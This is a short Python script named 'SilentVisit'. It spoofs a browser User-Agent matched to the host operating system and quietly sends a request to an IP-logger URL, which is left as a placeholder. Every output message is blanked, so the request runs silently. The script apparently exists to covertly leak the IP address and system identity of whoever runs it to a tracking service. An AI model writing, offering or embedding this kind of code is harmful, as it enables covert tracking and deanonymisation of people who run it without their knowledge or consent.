import requests
import platform

class SilentVisit:

    def __init__(self, url):
        self.url = url
        self.user_agent = self.detect_user_agent()
        self.visit_site()

    def detect_user_agent(self):
        os_name = platform.system()

        if os_name == "Darwin":
            return ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) "
                    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15")
        elif os_name == "Windows":
            return ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299")
        else:
            return ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) "
                    "Gecko/20100101 Firefox/91.0")

    def visit_site(self):
        headers = {'User-Agent': self.user_agent}
        try:
            response = requests.get(self.url, headers=headers)
            if response.status_code == 200:
                print(f"")
            else:
                print(f"")
        except Exception as e:
            print(f"")

if __name__ == "__main__":
    url = " Your ip logger URL "
    SilentVisit(url)
